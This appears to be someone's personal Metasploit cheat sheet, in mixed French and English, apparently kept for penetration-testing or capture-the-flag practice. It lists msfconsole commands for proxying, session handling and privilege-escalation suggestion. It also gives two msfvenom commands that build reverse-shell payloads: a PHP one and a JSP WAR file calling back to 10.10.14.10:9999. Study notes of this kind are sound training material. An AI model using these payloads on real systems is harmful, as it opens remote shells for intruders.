> migrate explication
> cheatsheet
> msfvenom script generation explain
> difference between setg and set
> sessions -i <number>

```bash

 # rediriger les requettes vers Burp
 set PROXIES HTTP:127.0.0.1:8080
 set RPORT PORT # ou 80
```

```bash
#list payloads 
msfvenom  --list payloads

# utilisation de msfvenom pour generer un reverse shell php
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

```bash
# privilege escalation audit and suggestion
use post/multi/recon/local_exploit_suggester
```


```bash
# run in background
bgrun

# put session in backgroud
background | ctrl + Z
```

```bash
# locate file to copy exploit that are not in current msfconsole
locate exploits

# update
apt update; apt install metasploit-framework
```

```bash
# java reverse tcp payload 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f war -o rshell.war 
```


**Ressources**

[Metasploit official doc](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
[MSF venom payload](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)